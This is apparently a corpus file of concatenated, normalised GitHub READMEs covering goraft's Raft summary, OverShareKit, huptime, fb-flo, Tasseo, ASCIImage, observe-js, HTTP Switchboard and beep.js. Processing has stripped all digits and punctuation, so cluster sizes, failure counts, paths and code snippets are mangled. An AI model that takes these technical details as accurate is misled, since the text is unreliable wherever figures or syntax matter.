9372336, note this project is unmaintained if you are using goraft in a project and want to carry the project forward please file an issue with your ideas and intentions the original project authors have created new raft implementations this is a go implementation of the raft distributed consensus protocol raft is a protocol by which a cluster of nodes can maintain a replicated state machine the state machine is kept in sync through the use of a replicated log for more details on raft you can read in search of an understandable consensus algorithm raft paper by diego ongaro and john ousterhout this library is feature complete but should be considered experimental until it has seen more usage if you have any questions on implementing go raft in your project please file an issue there is an active community community of developers who can help go raft is under the mit license leader election log replication configuration changes log compaction unit tests fast protobuf log encoding http transport these projects are built on go raft if you have a project that you re using go raft in please add it to this readme so others can see implementation examples and implementation of raft not goraft specific but helpful if you have questions diagrams of leader election and replication the raft consensus homepage raft home has links to additional raft implementations slides to talks on raft and general information this section provides a summary of the raft protocol from a high level for a more detailed explanation on the failover process and election terms please see the full paper describing the protocol in search of an understandable consensus algorithm raft paper maintaining state in a single process on a single server is easy your process is a single point of authority so there are no conflicts when reading and writing state even multi threaded processes can rely on locks or coroutines to serialize access to the data however in a distributed system there is no single point of authority servers can crash or the network between two machines can become unavailable or any number of other problems can occur a distributed consensus protocol is used for maintaining a consistent state across multiple servers in a cluster many distributed systems are built upon the paxos protocol but paxos can be difficult to understand and there are many gaps between paxos and real world implementation an alternative is the raft distributed consensus protocol raft paper by diego ongaro and john ousterhout raft is a protocol built with understandability as a primary tenet and it centers around two things  leader election  replicated log with these two constructs you can build a system that can maintain state across multiple servers even in the event of multiple failures the raft protocol effectively works as a master slave system whereby state changes are written to a single server in the cluster and are distributed out to the rest of the servers in the cluster this simplifies the protocol since there is only one data authority and conflicts will not have to be resolved raft ensures that there is only one leader at a time it does this by performing elections among the nodes in the cluster and requiring that a node must receive a majority of the votes in order to become leader for example if you have  nodes in your cluster then a single node would need  votes in order to become the leader for a  node cluster a server would need  votes to become leader to maintain state a log of commands is maintained each command makes a change to the state of the server and the command is deterministic by ensuring that this log is replicated identically between all the nodes in the cluster we can replicate the state at any point in time in the log by running each command sequentially replicating the log under normal conditions is done by sending an appendentries rpc from the leader to each of the other servers in the cluster called peers each peer will append the entries from the leader through a  phase commit process which ensure that a majority of servers in the cluster have entries written to log the primary consideration when choosing the node count in your raft cluster is the number of nodes that can simultaneously fail because raft requires a majority of nodes to be available to make progress the number of node failures the cluster can tolerate is n and   this means that a  node cluster can tolerate  node failure if  nodes fail then the cluster cannot commit entries or elect a new leader so progress stops a  node cluster can tolerate  node failures a  node cluster can tolerate  node failures it is unlikely that  nodes will simultaneously fail so clusters larger than  nodes are not common another consideration is performance the leader must replicate log entries for each follower node so cpu and networking resources can quickly be bottlenecked under stress in a large cluster once you grow beyond the maximum size of your cluster there are a few options for scaling raft  core nodes with dumb replication this option requires you to maintain a small cluster e g  nodes that is involved in the raft process and then replicate only committed log entries to the remaining nodes in the cluster this works well if you have reads in your system that can be stale  sharding this option requires that you segment your data into different clusters this option works well if you need very strong consistency and therefore need to read and write heavily from the leader if you have a very large cluster that you need to replicate to using option  then you may want to look at performing hierarchical replication so that nodes can better share the load he put it under the mit license in the hopes that it would be useful for other projects too

14027551, oversharekit  sharing is far too cumbersome to implement on ios uiactivityviewcontroller is too limiting and rolling your own library is too time consuming most devs end up settling for underwhelming sharing options for lack of the time or inclination to make something better oversharekit makes it trivial to add rich sharing options to your ios apps in a word oversharekit has everything beautiful share sheets with pixel perfect full color icons in a simple layout lots of tweakable options including a gorgeous dark mode built in integration with ios twitter and facebook accounts built in integration with popular third party services like app net instapaper and more complete multi account management including authentication and storing credentials securely in the keychain we happily accept any pull request that adds meaningful value for the oversharekit community bug fixes can be submitted on any branch but significant changes and new features must be submitted on the dev branch for wider testing and review our day to day work is done on the dev branch watch the dev branch for an idea of what s coming oversharekit is designed to be dead simple for the easy cases while still being flexible enough to scale up to more complex needs and without breaking inbetween after including oversharekit in your xcode project see the detailed requirements below  the steps to get started couldn t be easier  create an instance of oskshareablecontent  ideally via one of the convenient class level constructors like contentfromurl  pass that shareable content to the oskpresentationmanager via one of the presentactivitysheetforcontent methods  there is no step  we are frequently asked why someone would use oversharekit instead of uiactivityviewcontroller uiavc and uiactivity uiavc is great for apps that know they ll never have a need for any of the following  never need to integrate with more than one or two third party services  never need to tweak the ui for the activity sheet and sharing screens  never care to provide separate media specific content for each sharing type email versus sms etc  never need to have multiple items such as a copy text versus a copy link in the same sheet  don t mind that all non system provided activities get stuck with boring monochromatic icons many apps can t fit comfortably within those restrictions which is why we made oversharekit the most important difference between uiavc and oversharekit is in how content is structured uiavc uses unstructured arrays of content which contain one or more of a grab bag of objects usually strings images and urls uiavc lets each uiactivity decide which of these objects if any it will act upon and how the shortcoming of this api design is that activities don t know anything about the context in which a sharing session is taking place for example the formatting for an email message generated from an instagram post should look very different from an email generated from an rss article but with uiavc there s no easy way to communicate that context most crucially it is impossible to do this using uiavc without providing substitutes for the system provided mail activities activities should not be given that much responsibility over content the content should be ready to consume before it is handed to an activity furthermore the content should be formatted in a manner that is appropriate to each type of activity this is why oversharekit uses an instance of oskshareablecontent that bristles with many flavors of oskshareablecontentitem this api design allows the part of your app that has knowledge of context to prepare all the various types of oskshareablecontentitems before handing it off to an oversharekit sharing session this results in a more satisfying sharing experience for the user and less overall hassle for the developer oversharekit has lots of classes but here are the main players oskpresentationmanager this singleton instance manages the user interface layers of oversharekit it s the class you access to present activity sheets share sheets it s also how you can customize the ui of oversharekit via four delegates each for different customization purposes a style delegate a color delegate a localization delegate and a view controller delegate if you already like the default look feel of oversharekit you probably won t need to implement any of these delegates oskactivitiesmanager this singleton instance handles model level logic around sharing activities unless you re writing your own view controllers you probably won t need to access this class much except to provide application specific third party credentials see authentication section below oskactivity this semi abstract base class is the heart and soul of oversharekit all sharing activities inherit from it oversharekit comes with lots of built in subclasses of oskactivity you can easily write your own subclasses too activities provide important information about how they perform their tasks via lots of required methods oskshareablecontent is the highest level oversharekit model object for passing around shareable content it s sole purpose is to bristle with subclasses of oskshareablecontentitem  making it easy to pass many flavors of content in a single method argument oskshareablecontentitem represents the user s data in a structured readable portable way it is an abstract base class with many subclasses because each kind of oskactivity requires different bits of data and metadata there is an oskshareablecontentitem subclass for each conceivable type of activity think of oskshareablecontentitem like uinavigationitem or uitabbaritem navigation controllers and tab bar controllers use those items to keep title and toolbar item changes in sync with child view controller changes it s a convenient paradigm that is useful for our purposes too oskshareablecontent see above has many oskshareablecontentitem subclass properties like emailitem  microblogpostitem  webbrowseritem  etc oskmanagedaccount third party accounts like app net accounts are represented in oversharekit by instances of oskmanagedaccount oversharekit manages the creation authentication and storage of these accounts this class is not intended to be subclassed oversharekit does not create managed accounts for services that are managed at the system level i e twitter or facebook oskmanagedaccountstore this singleton instance manages storing and organizing all the oskmanagedaccounts for activities tied to third party services osksystemaccountstore this singleton instance manages access to system level accounts like twitter and facebook for the most part oversharekit will handle all aspects of authentication by itself there are several crucial exceptions to this which every app will need to be configured to handle some third party services require application specific credentials in order to authenticate user actions the sample app that ships with oversharekit has been configured to use some test app credentials if the compiler flag for debug is set to  you must not ship oversharekit s test credentials in a production application they may be revoked at any time we will not be responsible for any consequences if that happens please see the next several paragraphs for more information on setting up application credentials you can provide your app s credentials via the customizationsdelegate property of oskactivitiesmanager these credentials are represented by instances of oskapplicationcredential the list of services currently requiring application credentials are google plus you ll need to obtain an application key by registering your app with google plus if you have any questions about this setup process don t hesitate to ask oversharekit is almost entirely a standalone library all of its categories and classes have been properly namespaced with the osk prefix to avoid collisions there are two required external libraries which are included as git submodules in the depedencies directory the google plus framework in the dependencies directory is not a submodule you can optionally configure certain activity types to require in app purchase oversharekit does not handle purchasing or receipt validation but it does handle the logic around presenting your custom purchasing view controller at the appropriate time oversharekit will even badge the activity icons with cute little price tags when they have not yet been purchased see the header files for oskactivitiesmanager and oskpurchasingviewcontroller for more details recent additions are at the top of the list cardasee modern quick notes nvnotes the professional note taking app that allows you to focus on writing unread

13286687, high uptime  huptime is a tool for achieving zero downtime restarts without the need to modify your program in any way although many applications support reloading configurations while running a zero downtime restart allows for upgrading the application code without rejecting any clients basic example  in a terminal run huptime exec python m simplehttpserver pid then in a second terminal finally in a third terminal or back in the first kill hup pid you should see no fail output on the second terminal with this reload the complete code for simplehttpserver is reloaded potentially with changes  but at no time are connections denied or dropped when the new version is up and running again i e it binds the socket and calls accept  then pending connections will be processed with continuous deployment software can be updated dozens hundreds or even thousands of times per day it is critical that service is not interrupted during upgrades in an ideal world all applications would support a mechanism for doing zero downtime restarts the reality is that many standard frameworks make this difficult to do from the top down it s not practical to plumb this functionality through every layer particularly for applications over which you have no control compound this with the fact that many applications consist of many different small components written using different languages and frameworks  and you ve got yourself a headache because of this complexity one of the first things people have to do is implement a custom load balancing tier and a complex upgrade process although this is important at a certain scale it shouldn t be that hard for simple services it s crazy to add a whole new tier when the problem can be solved in a much simpler way huptime attempts to make it very simple to achieve these restarts for simple unmodified applications how do i install it  building this package gnerally requires gcc and g and and rpmbuild optional and dpkg optional clone the repo install it the old fashioned way cd huptime sudo make install want ubuntu debian packages cd huptime make deb dpkg i huptime deb how about centos or redhat cd huptime make rpm rpm i huptime rpm how do i use it  you simply need to run services via huptime for example start the service huptime and usr and bin and myservice zero downtime restart killall hup myservice or if you prefer huptime restart and usr and bin and myservice if there is a pidfile it can be reset on restart start the service huptime unlink and var and run and myservice pid and usr and bin and myservice zero downtime restarts killall hup myservice again if you prefer huptime restart and usr and bin and myservice or if you need exec for example to run under upstart start the service and get the pid huptime exec and usr and bin and myservice pid zero downtime restart same pid kill hup pid again as always huptime restart and usr and bin and myservice what does it support  huptime should and handle the following normal things daemonization pid files process pools multiple server sockets event based and thread based servers integration with supervisors just use exec in terms of languages and frameworks huptime should support nearly all programs that are dynamically linked against a modern libc most modern dynamic languages python ruby node etc fall into this category most c and c and and programs also fall into this category a unique exception is go  which invokes system calls directly and uses only static linking for the record i am a big fan of this approach however both have their and should ymmv what else does it do  transparent multi binding running the same service multiple times if you are running linux   and  then you can also easily enable pools of processes by starting your services with the multi option again this does not require any modification on your application for example start the service  workers huptime multi  and usr and bin and myservice zero downtime restart of all killall hup myservice or if you prefer huptime restart and usr and bin and myservice want to manage the number of running scripts yourself pids reload for pid in pids do kill hup pid done stop for pid in pids do kill term pid done trap reload sighup trap stop sigterm trap stop sigint count  while count lt n do huptime multi  and usr and bin and myservice pids pids count count and  for pid in pids do wait pid transparent restart on exit if you ve got a stubborn program and you want to restart it automatically when it fails you should really fix your program barring that you should use a supervisor like upstart barring that you don t care about the sensible features that a supervisor provides and want zero downtime restarts  you can use huptime to enable this option simply specify revive on the huptime command line for example start a zero downtime netcat huptime revive nc l  message txt clients will always find a server nc localhost  how does it work  huptime installs a signal handler for sighup it tracks open file descriptors by intercepting calls to bind and accept among other things when the program receives a sighup  it will intelligently exec a new copy of the program without closing any bound sockets and without requiring any changes to the program note that this is not simply a reload but rather a new version of the application with config changes and code changes as both now appear on disk when the new copy of the program tries to bind the same socket huptime will silently replace it with the still open socket from the previous version there are two fundamental modes of operation fork default if you use fork then when the process receives a sighup  then it will fork and exec a new copy of the application this results in less downtime as new requests can start being served immediately while old requests are still being finished by the original program this may not integrate cleanly with supervisor processes like upstart however which depend on the pid of the application staying constant this may also present issues for some applications that check pidfiles or contain internal mechanisms for preventing two copies of themselves from running huptime goes to some effort to prevent conflict allowing for unlink prior to executing the child  but it may still arise if you use exec then when a process receives a sighup  then it will begin queueing requests to the bound socket in the kernel and wait until all outstanding requests are finished only when existing requests are finished will the program restart this may not work properly if requests are not bounded in how long they will take this may also lead to high response times for some clients during the restart however this approach will play well with supervisors for example if you are using upstart you can do the restart as upstart reload service limitations  although the majority of programs will work i m sure that all will not the exit is not done through the normal application path on restart although all file descriptors are closed there may be application level resources or some system resources that are not cleaned up as expected and may cause problems the command line and environment cannot be changed between restarts you can easily work around this issue by putting all configuration inside a file that is read on start up i e myservice config file and etc and myservice cfg what s up with the name  it s clever services are often reloaded using sighup the point of this tool is to maximize uptime by enabling zero downtime restarts via sighup it s your high availabilibuddy

installing the chrome extension npm install fb flo fb flo exports a single fb flo function to start the server here is an example where you have your source javascript and css files in the root directory and your build step involves bundling both into a respective bundle js  bundle css var flo require fb flo  path require path  fs require fs var server flo sourcedirtowatch port  host localhost  verbose false glob and and all js files in sourcedirtowatch and subdirectories and js  and and all css files in sourcedirtowatch and subdirectories and css function resolver filepath callback and and  call into your compiler and bundler and and  assuming that bundle js is your output file update bundle js and and and bundle css when a js or css file changes callback resourceurl bundle and path extname filepath  and and any string ish value is acceptable i e strings buffers etc contents fs readfilesync filepath  update function window resourceurl and and this function is executed in the browser immediately after the resource has been updated with new content and and perform additional steps here to reinitialize your application so it would take advantage of the new resource console log resource and resourceurl and has just been updated with new content flo takes the following arguments sourcedirtowatch absolute or relative path to the directory to watch that contains the source code that will be built options hash of options port port to start the server on defaults to  host to listen on verbose true or false value indicating if flo should be noisy glob a glob string or array of globs to match against the files to watch usefilepolling some platforms that do not support native file watching you can force the file watcher to work in polling mode pollinginterval if in polling mode usefilepolling then you can set the interval in milliseconds at which to poll for file changes watchdotfiles dot files are not watched by default disablewatcher set to true to disable starting a watcher if you want to integrate with your own watcher resolver a function to map between files and resources the resolver callback is called with two arguments filepath path to the file that changed relative to the watched directory callback called to update a resource file in the browser should be called with an object with the following properties resourceurl used as the resource identifier in the browser contents any string ish value representing the source of the updated file i e strings buffers etc reload optional forces a full page reload use this if you re sure the changed code cannot be hotswapped match optional defaults to indexof identifies the matching function to be performed on the resource url in the browser could be one of the following equal test the updated resource resourceurl against existing browser resources using an equality check indexof use string prototype indexof check and regexp and a regexp object to exec update optional a function that will be executed in the browser immediately after the resource has been updated this can be used to run custom code that updates your application it receives the window and the resourceurl as parameters this function will be stringified so it could be sent to the client make sure you don t use any variables defined outside this function as they won t be available and you will get an error to activate fb flo from the browser open chrome devtools click on the new fb flo pane click on activate for this site see screenshot as an alternative to the update function after any resource is updated the fb flo reload event will be triggered on the window the event s data will contain the url and contents that were provided to the callback function on the flo server the difference between the the update function and the fb flo reload event is that the first one is defined on the server and executed in the client while the later is defined on the client and executed there as well it is preferred to use the update function since you won t load your app with code specific to live editing example window addeventlistener fb flo reload  function ev and and perform additional steps here to reinitialize your application so it would take advantage of the new resource console log resource and ev data url and has just been replaced with this new content and ev data contents say you have a makefile program that builds your javascript and css into build and build js and build and build css respectively this how you d configure your fb flo server var flo require fb

4164796, reading the tea leaves tasseo is a lightweight easily configurable near realtime dashboard for time series metrics charts are refreshed every two seconds and provide a heads up view of the most current value the default behavior is designed for a retention policy with a  second resolution for at least  minutes although this can be modified within the dashboard and metric attributes tasseo was originally designed for the graphite tsdb but has since been extended to support influxdb librato metrics and amazon cloudwatch backend sources creating your own dashboard is as simple as dropping a json file into the dashboards directory committing it and pushing the code to a heroku app the name of your file minus the js suffix becomes the name of your dashboard here s an example configuration that you could put in e g dashboards and example js var metrics alias pulse events per second  target pulse pulse events per second  warning  critical  the target attribute is the only

32292629, create uiimage and nsimage instances from nsstring by combining ascii art and kindergarten skills while it was initially developed with bitmaps in mind and while the ascii representation looks like pixels the connect the numbers approach makes it a vector drawing tool with forced pixel alignment this can be confusing even i was confused without realizing i did not use the word vector once in my original blog post only when the first editor was developed asciimage super studio did i realize it could draw very large images with smooth curves and output things i had never envisioned that is because behind the scenes shapes are first made into nsbezierpath in the end of course everything on a screen ends up as pixels the idea and initial implementation was mostly a one day hack but i did refine a few details over the year that followed before finally making it public in march  as a result of these tweaks it is really filling out all my needs for what i use it for i may add a few more options to the drawing context in the block based api in particular to exploit the vector aspect more with scaling and smooting options i am also curious to see what others do with it but i think i want to really keep it simple and restricted to the original spirit code and image in one place with instant gratification for more complex things designers real image editors and real formats should be used please let me know if you use asciimage in a shipping app and i ll add it to the list here it simply add the following line to your podfile pod asciimage an image is defined by an array of strings where each string represents a row here is an example nsarray asciirepresentation               a                                                                              in this documentation i ll just represent it as follows              a                                                                     whitespace is ignored the  representations below are thus equivalent it should be clear why using extra whitespace is recommended it really helps make the content appear at the right aspect ratio                      a        a                                                                                                                                 each row should have the same number of non whitespace character or else you get nothing but a mysterious console log these representations are invalid i n v a l i d n o g o o d                  a     a                                                                        while all non whitespace characters count as part of the pixel grid most characters are passive only the following characters are considered as part of shapes          a b c d e f g h i j k l m n o p q r s t u v w x y z a b c d e f g h i j k l m n p q r s t u v w x y z note that the o zero and o lowercase letter o are ignored the current implementation does not ignore the uppercase letter o any of those  things could be considered a bug but that s just the way i thought it would be best maybe i ll regret it probably not all the other characters are ignored when it comes time to extract shapes from the grid of characters all the following representations are thus equivalent the signs in those examples are very useful as a guide for the eyes and i use them all the time works well too but they can also be used for evil obfuscation bad                            a      a      a       a                                                                                                                                                                        before being rendered into an nsimage the ascii grid is transformed into a series of nsbezierpath the next sections describe the different types of bezier paths that may be created the simplest use of the above characters is to draw polygons using the famous connect the numbers technique each polygon is defined by a series of sequential characters and a new polygon is started as soon as you skip a character in the above list so the first polygon could be defined by the series   the next shape with abcdef  the next with hijklmnop  etc for polygons each character can only be used once or never if you run out of characters you are probably abusing asciimage here is an example with  polygons defined with the series a  then cde and finally ghijkl note that the characters b and f were skipped to separate the three polygons the second example next to it is equivalent but the last polygon uses the series abcdef for no good reason but also no bad reason         c   e         c   e                            a            a                    d            d g  h          a  b                                    i j           c d         l   k         f   e                                                                                                         when a polygon is composed of just  character it is made into a square filling out the corresponding point the following representation contains  separate points            t                                     when a character is used exactly twice the corresponding shape will be a line joining the two points center to center with square ends which will fill the pixels exactly when using a  point width for drawing since such characters are used more than once they cannot be part of a polygon and there is no need to skip characters between a line and any other shape here is an example with  lines and a triangle note how we don t skip any character but we could                                                         when a character is used three or more time the corresponding shape will be an ellipse defined by the largest rectangles that include all the points all the following representations will produce the same  point diameter circle                                                                                                                                                                                                                                                                                                                                                                            the word api is a bit grandiose for asciimage it is just an nsimage category with  class methods the simplest method that i use  of the time and parimage

38608658, apple delivered ios  to the developer world at wwdc in june  before launching it to the public in september the ios  sdk introduced some big changes to the user such as ipad multitasking and search and siri enhancements the majority of the new features were focused on optimization and performance enhancements a large number of new apis were introduced and ios day by day is a review of the most important of these the motivation behind this is that busy developers don t have time to trawl the wwdc videos and apple documentation instead they d like to get a high level summary of the new possibilities alongside some working sample code this is exactly what ios day by day provides this repository contains all the source code associated with each of the articles allowing you to see each of the new technologies in action the blog posts typically have a project which demonstrates the functionality in action rather than just being a purely theoretical overview of the technology

5372136, observe js implements a set of observers pathobserver arrayobserver objectobserver compoundobserver observertransform which all implement the observable interface javascript and and begins observation value changes will be reported by invoking and changefn and with and and and optreceiver and as the target if provided returns the initial value of the observation open function changefn optreceiver  and and report any changes now does nothing if there are no changes to report deliver function  and and if there are changes to report ignore them returns the current value of the observation discardchanges function  and and ends observation frees resources and drops references to observed objects close function pathobserver observes a value at a path from a given object javascript var obj foo bar baz var defaultvalue  var observer new pathobserver obj foo bar  defaultvalue observer open function newvalue oldvalue and and respond to obj foo bar having changed value pathobserver will report a change whenever the value obtained by the corresponding path expression e g obj foo bar would return a different value pathobserver also exposes a setvalue method which attempts to update the underlying value setting the value does not affect notification state in other words a caller sets the value but does not discardchanges  the changefn will be notified of the change javascript observer setvalue boo assert obj foo bar boo if the path is ever unreachable the value is considered to be undefined unless you pass an overriding defaultvalue to new pathobserver as shown in the above example if the path is empty e g  it is said to be the empty path and its value is its root object pathobservation respects values on the prototype chain arrayobserver observes the index positions of an array and reports changes as the minimal set of splices which would have had the same effect javascript var arr     var observer new arrayobserver arr observer open function splices and and respond to changes to the elements of arr splices foreach function splice splice index and and the index position that the change occurred splice removed and and an array of values representing the sequence of removed elements splice addedcount and and the number of elements which were inserted arrayobserver also exposes a utility function applysplices the purpose of applysplices is to transform a copy of an old state of an array into a copy of its current state given the current state and the splices reported from the arrayobserver javascript araryobserver applysplices function previous current splices objectobserver observes the set of own properties of an object and their values javascript var myobj id  foo bar var observer new objectobserver myobj observer open function added removed changed getoldvaluefn and and respond to changes to the obj object keys added foreach function property property and and a property which has been been added to obj added property and and its value object keys removed foreach function property property and and a property which has been been removed from obj getoldvaluefn property and and its old value object keys changed foreach function property property and and a property on obj which has changed value changed property and and its value getoldvaluefn property and and its old value compoundobserver allows simultaneous observation of multiple paths and and or observables it reports any and all changes in to the provided changefn callback javascript var obj var otherobj c  var observer new

member accesses foo bar and key lookup with literal values arr  obj str value bar baz path get foo bar baz returns a path object which represents the path path objects have the following api javascript and and returns the current value of the path from the provided object if eval is available and and a compiled getter will be used for better performance like pathobserver above undefined and and is returned unless you provide an overriding defaultvalue getvaluefrom function obj defaultvalue  and and attempts to set the value of the path from the provided object returns true iff the path and and was reachable and set setvaluefrom function obj newvalue path objects are interned e g assert path get foo bar baz path get foo bar baz and are used internally to avoid excessive parsing of path strings observers which take path strings as arguments will also accept path objects observe js is intended for use in environments which implement object observe but it supports use in environments which do not if object observe is present and observers have changes to report their callbacks will be invoked at the end of the current turn microtask in a browser environment this is generally at the end of an event if object observe is absent platform performmicrotaskcheckpoint must be called to trigger delivery of changes if object observe is implemented platform performmicrotaskcheckpoint has no effect

12897630, a chromium browser extension which let you whitelist or blacklist requests originating from within a web page according to their type and and or destination as per domain name as of may  the extension comes with preset blacklists totaling over  distinct hostnames out of the box these lists can be disabled or more can be enabled i strongly advise against installing from any other sources i expect the extension to work on a stable release of any chromium based browser much effort has been spent on creating highly efficient filtering engines httpsb can hold tens of thousands more filtering rules in memory while having a significantly smaller memory and cpu footprint than other comparable popular blockers in the picture below httpsb was running with over k filters tens of thousands more than other blockers after running this the memory footprints sup adblock plus easylist easyprivacy adblock easylist easyprivacy malware protection adguard english filter spyware tracking filter phishing malware protection httpsb  malware ads trackers etc hostname based filters  abp compatible net filters  abp compatible cosmetic filters garbage collection was forced for all blockers using chromium dev tools and sup http switchboard foss put you in full control of where your browser is allowed to connect what type of data it is allowed to download and what it is allowed to execute nobody else decides for you you choose you are in full control of your privacy see all the remote connections failed or attempted depending on whether they were blocked or allowed you decide a single click to whitelist and blacklist one or multiple classes of requests according to the destination and type of data a blocked request will never leave your browser efficient blacklisting cookies won t leave your browser javascript won t execute plugins won t play tracking pixels won t download etc you do not have to solely rely on just one particular curated blacklist arguably with many missing entries outside which nothing else can be blocked ease of use http switchboard lets you easily whitelist and blacklist net requests which originate from within a web page according to a point and click matrix domain names left column from very specific to very generic type of requests top row cookies css stylesheets and web fonts images objects scripts xhr requests made by scripts frames you can blacklist and whitelist a single cell an entire row a group of rows an entire column or the whole matrix with just one click http switchboard matrix uses precedence logic to evaluate what is blocked and allowed according to which cells are blacklisted and whitelisted for example this allows you to whitelist a whole page with one click without having to repeatedly whitelist whatever new data appear on the page you can also create scopes for your whitelist and blacklist rules for example this allows you to whitelist facebook com only when visiting facebook web site the goal of this extension is to make the allowing or blocking of web sites wholly or partly as straightforward as possible so as to not discourage those users who give up easily on good security and privacy habits as of april  the extension comes with preset blacklists totaling nearly  distinct hostnames each list can be disabled and enabled according to your choice and there are more preset blacklists which you can activate if you wish so ultimately you can choose however you browse the net blacklist all by default and whitelist as needed default mode whitelist all by default and blacklist as needed either way you still benefit from the preset blacklists so that at least you get basic protection from trackers malware sites etc or you can disable all of these preset blacklists your choice this is pre version   more work is intended you are very welcomed to contribute your views on open issues and suggestions various arguments for and against help me in deciding what is needed to improve the extension ease of use is the primary goal i ve seen users give up on firefox s noscript because it gets too much in the way according to them so rather than blame these users for poor security habits i prefer to blame developers and this project is a tentative to address the issues which cause some users to give up on basic security this extension is also useful to understand what the web page in your browser is doing behind the scene you have full ability to see and decide with whom a web page communicates and to restrict these communications to specific classes of objects within the web page the number which appear in the extension icon correspond to the total number of distinct requests attempted successfully or not depending on whether these were allowed or blocked behind the scene simply click on the appropriate entry in the matrix in order to white  black or graylist a component graylisting means the blocked or allowed status will be inherited from another entry with higher precedence in the matrix red square effectively blacklisted i e requests are prevented from reaching their intended destination dark red square the domain name and and or type of request is specifically blacklisted faded red square the blacklist status is inherited because the entry is graylisted green square effectively whitelisted i e requests are allowed to reach their intended destination dark green square the domain name and and or type of request is specifically whitelisted faded green square the whitelist status is inherited because the entry is graylisted the top left cell in the matrix represents the default global setting which allows you to choose whether allowing or blocking everything is the default behavior some prefer to allow everything while blocking exceptionally my personal preference is of course the reverse blocking everything and allowing exceptionally this extension is also useful if you wish to speed up your browsing by blocking all requests for images as an example http switchboard is the fruit of a personal project there no company of any kind involved therefore no agenda other than giving users the tools to be in complete control of their browser i appreciate the thought but i do not want donation now or in the future

32997960,  tl dr create a synthesizer with one line of code synth new beep instrument tap the pulsing play button for a midi controller support  beep accepts input from midi controller keyboards via the brand new very awesome you ll need either chrome  or chrome  and for chrome  you must enable the web midi api manually by visiting chrome and and flags and enable web midi and clicking enable for chrome  and later this is enabled by default simply plug in your modern midi controller keyboard via usb then load up beep your keys and pitch bending wheel will work just fine and further support is coming soon  beep is a javascript toolkit for building browser based synthesizers using the webaudio api it takes a  batteries included approach meaning it boots up ready to give you the audio equivalent of  hello world  without too much fuss one line like synth new beep instrument will build a bundle of trigger interfaces each with its own voices for notes  that is a piano keyboard that you can begin banging on immediately but what s a software piano that can t play itself use synth scoreplay to play the default score provided for you and yes you can always write your own scores the blurb above and descriptions below include some sample code if you re new to hacking around in the browser you may be wondering where that code s supposed to go are you viewing this in a modern desktop browser then you can open up your browser s javascript console and start hacking away right now here s how   j then develop  show error console or   c   k or   i then click on the console tab  creating a new note is easy n new beep note but unless you re content with nothing but concert a s blaring at hz all day you re going to want to create other notes like so new beep note e or new beep note e for an e that s in the th octave rather than the default th octave so what does that e  give you anyway an object like this javascript a  and and what concert a are we tuned to hertz    and and frequency of the note isflat true and and set if  similar issharp and isnatural letter e  and and explains itself no letterindex  and and abcdefg indexof letter midinumber  and and corresponding midi controller keyboard code modifier   and and set to     or  name e  and and note name will include  nameindex  and and a  a  b  b  c  indexof name namesimple e  and and note name will not include  octaveindex  and and on a standard piano   pianokeyindex  and and on a standard piano   tuning edo and and default equal division of octave into  steps flexible parameters sure you can call new beep note e and accept the above default parameters that come with it but you can also send an object to note instead of a string and set each of those parameters manually no specific param is required so just send what you need javascript new beep note a  name e  octaveindex  by the numbers can we just throw all this named note garbage out the window yes want the devil s note try new beep note  what does that give you hertz  i happen to like named notes though they provide a pretty nice grid to work with eh easy ascii it might quell your anxieties to know that note will intelligently convert the common   number into a proper   sharp and will also accept a lowercase b as a substitue for   flat there s no need to use   natural but it is in the code there should you desire to invoke it smart conversion if you commit a serious blunder like new beep note b don t stress note will kindly assume you intended note c instead if you happen to be old school german then yes you can use h instead of b similarly there is no h weirdo western tunings right now only western tunings are supported i m afraid that s all i know how to work with all note params pass through note validatewestern which does the above fancy logic from there i ve included support for two separate more needs to be written on this topic for sure bach up a second so all that s great but a note is just a mathematical model you ll notice it has no play method for example it doesn t make any sound for that we will need a voice  how do you make a note sing give it a voice or rather create a voice initialized with a note and maybe pass it an audiocontext to pipe the sound out to just as with note the arguments for voice are all optional providing none will yield a voice with a default note of hz javascript voice new beep voice and and we re running with defaults voice play and and listen to that pure hz concert a voice pause and and ok we ve had enough note arguments voice will pass note like arguments to note it doesn t take an in state liberal arts degree to imagine what new beep voice e or new beep voice a  name e  octaveindex  might produce then you could even try new beep voice new beep note e if you re not into that whole brevity thing man audio arguments if you do not pass an audiocontext or gainnode to voice it will create an audiocontext for itself this is convenient because it means voice just works batteries included eh but there are hardware limits on the number of audiocontexts you can create we ll see how to solve this later by creating an instrument and passing its audiocontext to each voice only fix what s baroque i guess all the above is pretty cool but having to type voice play and voice pause everytime i want to voice a note is kind of a drag and that s where trigger comes in  we can dream up a note  give it a voice  but wouldn t it be great if we had some visible dom elements and event listeners working on our behalf behold your default concert a t new beep trigger simply creating a new trigger will also construct the dom bits and listeners for you no further fuss necessary notes voices as you may have guessed trigger will create a voice for you and assign it a note setting this at initialization time is trivial new beep trigger e see the voice description above to get an idea of the variation possible here and it s likewise trivial to alter the note or voice after creation many voices rather than one single voice trigger is setup to handle a whole array of them in fact the default trigger uses two voices one employs a sine wave oscillator at the intended note while a second employs a square wave osciallator running one octave lower for a nice chunky nintendo sound customizing your instance s createvoices method is the name of the game audio arguments just like voice  trigger is happy to ingest an audiocontext or gainnode argument but will make do without one if it has to see the above voice blurb for more details additionally you can pass it a function customizing trigger s createvoices method upon initialization each instance of trigger calls its createvoices method if you re the type of gal that likes to annihilate mosquitos using atom bombs then you can just overwrite beep trigger prototype createvoices otherwise why not pass a custom function during initialization like so javascript var trigger new beep trigger eb  function this voices push and and let s call this our  foundation voice and and because it will sing the intended note new beep voice this note this audiocontext setoscillatortype sine setattackgain    and and this voice will sing a perfect th above the foundation voice new beep voice this note hertz  and  this audiocontext setoscillatortype triangle setattackgain    and and this voice will sing  octaves above the foundation voice new beep voice this note hertz  this audiocontext setoscillatortype sawtooth setattackgain    and and this voice will sing  octave below the foundation voice new beep voice this note hertz and  this audiocontext setoscillatortype square setattackgain   many triggers throw a few of these together and you have a mini keyboard what famous movie theme does this keyboard play notice how we can optionally add keyboard event listeners to bind characters to triggers here we ve assigned the characters   to activate the five triggers respectively javascript new beep trigger g addtriggerchar  new beep trigger a addtriggerchar  new beep trigger f addtriggerchar  new beep trigger f addtriggerchar  new beep trigger c addtriggerchar  what if we had a convenient way to bundle these triggers together you guessed it instrument to the rescue instruments  how simple is this synth new beep instrument you can pass the constructor either a dom element or a string representing the id of a dom element and it will target that for the build otherwise it will just create its own that one command gives you a default keyboard of triggers with voices and so on pretty nifty eh triggers sure upon creation your instance of instrument will run build on itself creating a default set of triggers but it is so easy to overwrite this function with your own custom keyboard you should do this there is a corresponding unbuild method for removing all of its triggers and that movie theme keyboard from above it comes built in as well javascript beep instrument prototype buildcloseencounters function this unbuild newtrigger g   newtrigger a   